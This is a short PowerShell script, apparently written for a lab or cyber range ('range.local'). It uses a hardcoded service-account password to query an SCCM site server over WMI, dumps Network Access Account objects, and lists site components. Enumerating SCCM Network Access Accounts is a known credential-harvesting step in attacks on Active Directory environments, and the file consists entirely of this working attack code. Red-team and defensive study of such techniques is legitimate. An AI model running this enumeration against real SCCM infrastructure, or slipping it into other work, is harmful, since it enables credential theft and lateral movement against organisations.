# SCCM admin-level: read SMS_NAA (Network Access Accounts) via provider
$ErrorActionPreference = "Continue"
$user = "range.local\svc_sccm"
$pass = "s3rv1c3_SCCM!"
$cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
$ns = "root\SMS\site_CAD"

Write-Output "=== SMS_NAA (Network Access Accounts) ==="
try {
  $naa = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_NAA" -Credential $cred -ErrorAction Stop
  if ($naa) {
    $naa | ForEach-Object { Write-Output "NAA: UserName=$($_.UserName) Account=$($_.Account) SiteCode=$($_.SiteCode)" }
  } else { Write-Output "NO_NAA" }
} catch { Write-Output "SMS_NAA err: $($_.Exception.Message)" }

Write-Output "=== SMS_SCI_Component (site components, admin-only) ==="
try {
  $comp = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_SCI_Component" -Credential $cred -ErrorAction Stop | Select-Object -First 5
  $comp | ForEach-Object { Write-Output "COMP: $($_.ComponentName) $($_.SiteCode)" }
} catch { Write-Output "SMS_SCI_Component err: $($_.Exception.Message)" }
Write-Output "=== SCCM_ADMIN_DONE ==="
